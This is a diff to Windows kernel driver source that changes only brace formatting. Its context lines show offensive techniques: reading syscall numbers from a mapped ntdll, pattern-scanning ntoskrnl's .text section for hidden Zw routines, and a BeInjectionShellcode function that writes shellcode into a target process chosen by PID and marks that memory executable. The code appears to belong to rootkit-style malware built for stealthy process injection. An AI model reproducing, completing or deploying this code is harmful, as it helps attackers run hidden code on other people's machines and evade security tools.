@@ -35,7 +35,8 @@ NTSTATUS
 GetSsn(
     _In_  LPCSTR  Function,
     _Out_ PUSHORT Ssn
-) {
+) 
+{
     PVOID             BaseAddr   = NULL;
     HANDLE            HSection   = NULL;
     ULONGLONG         ViewSize   = NULL;
@@ -50,7 +51,8 @@ GetSsn(
     // Open the section for ntdll.dll from \KnownDlls
     //
     Status = ZwOpenSection(&HSection, SECTION_MAP_READ | SECTION_QUERY, &ObjAttr);
-    if (!NT_SUCCESS(Status)) {
+    if (!NT_SUCCESS(Status)) 
+    {
         LOG_MSG("ZwOpenSection Failed With Status 0x%08X\n", Status);
         goto CLEANUP;
     }
@@ -59,7 +61,8 @@ GetSsn(
     // Map the section into memory for reading
     //
     Status = BeGlobals::pZwMapViewOfSection(HSection, (HANDLE)-1, &BaseAddr, 0, 0, &Large, &ViewSize, ViewUnmap, 0, PAGE_READONLY);
-    if (!NT_SUCCESS(Status)) {
+    if (!NT_SUCCESS(Status)) 
+    {
         LOG_MSG("ZwMapViewOfSection Failed With Status 0x%08X\n", Status);
         goto CLEANUP;
     }
@@ -80,7 +83,8 @@ GetSsn(
     //
     // Iterate over exported functions
     //
-    for (ULONG I = 0; I < ExportDirectory->NumberOfNames; I++) {
+    for (ULONG I = 0; I < ExportDirectory->NumberOfNames; I++) 
+    {
         PCHAR Name    = (PCHAR)(ModuleBase + Names[I]);
         PVOID Address = (PVOID)(ModuleBase + Functions[Ordinals[I]]);
 
@@ -127,14 +131,16 @@ CLEANUP:
 PVOID
 FindZwFunction(
     _In_ LPCSTR Name
-) {
+) 
+{
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
     USHORT   Ssn    = NULL;
 
     //
     // Validate the input parameter
     //
-    if (!Name) {
+    if (!Name) 
+    {
         LOG_MSG("Invalid parameters.\n");
         return NULL;
     }
@@ -149,7 +155,8 @@ FindZwFunction(
     // Retrieve the syscall number (SSN) of the specified function
     //
     Status = GetSsn(Name, &Ssn);
-    if (!NT_SUCCESS(Status)) {
+    if (!NT_SUCCESS(Status)) 
+    {
         LOG_MSG("GetSsn Failed With Status 0x%08X\n", Status);
         return NULL;
     }
@@ -165,8 +172,10 @@ FindZwFunction(
     // Iterate over all sections to find the .text section
     //
     PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&NtHeader->OptionalHeader + NtHeader->FileHeader.SizeOfOptionalHeader);
-    for (ULONG I = 0; I < NtHeader->FileHeader.NumberOfSections; I++) {
-        if ((*(PULONG)SectionHeader[I].Name | 0x20202020) == 'xet.') {
+    for (ULONG I = 0; I < NtHeader->FileHeader.NumberOfSections; I++) 
+    {
+        if ((*(PULONG)SectionHeader[I].Name | 0x20202020) == 'xet.') 
+        {
 
             ULONG_PTR Start    = (ULONG_PTR)BeGlobals::NtOsKrnlAddr + SectionHeader[I].VirtualAddress;
             ULONG_PTR End      = Start + SectionHeader[I].Misc.VirtualSize;
@@ -176,14 +185,17 @@ FindZwFunction(
             //
             // Scan the .text section for the known instruction pattern
             //
-            for (SIZE_T Offset = 0; Offset <= DataSize - sizeof(ZWPATTERN); Offset++) {
+            for (SIZE_T Offset = 0; Offset <= DataSize - sizeof(ZWPATTERN); Offset++) 
+            {
                 BOOLEAN Found = TRUE;
 
                 //
                 // Compare each byte of the pattern
                 //
-                for (SIZE_T J = 0; J < sizeof(ZWPATTERN); J++) {
-                    if (ZWPATTERN[J] != 0xCC && Data[Offset + J] != ZWPATTERN[J]) {
+                for (SIZE_T J = 0; J < sizeof(ZWPATTERN); J++) 
+                {
+                    if (ZWPATTERN[J] != 0xCC && Data[Offset + J] != ZWPATTERN[J]) 
+                    {
                         Found = FALSE;
                         break;
                     }
@@ -214,7 +226,8 @@ NTSTATUS
 BeInjectionShellcode(
     _In_ ULONG  Pid,
     _In_ PCWSTR FilePath
-) {
+) 
+{
     HANDLE            HProcess     = NULL;
     PVOID             BaseAddr     = NULL;
     SIZE_T            ResultNumber = NULL;
@@ -287,7 +300,8 @@ BeInjectionShellcode(
     // Change memory protection to executable
     //
     Status = BeGlobals::pZwProtectVirtualMemory(HProcess, &BaseAddr, &Size, PAGE_EXECUTE_READ, &OldProtect);
-    if (!NT_SUCCESS(Status)) {
+    if (!NT_SUCCESS(Status)) 
+    {
         LOG_MSG("ZwProtectVirtualMemory Failed With Status 0x%08X\n", Status);
         goto EXIT;
     }
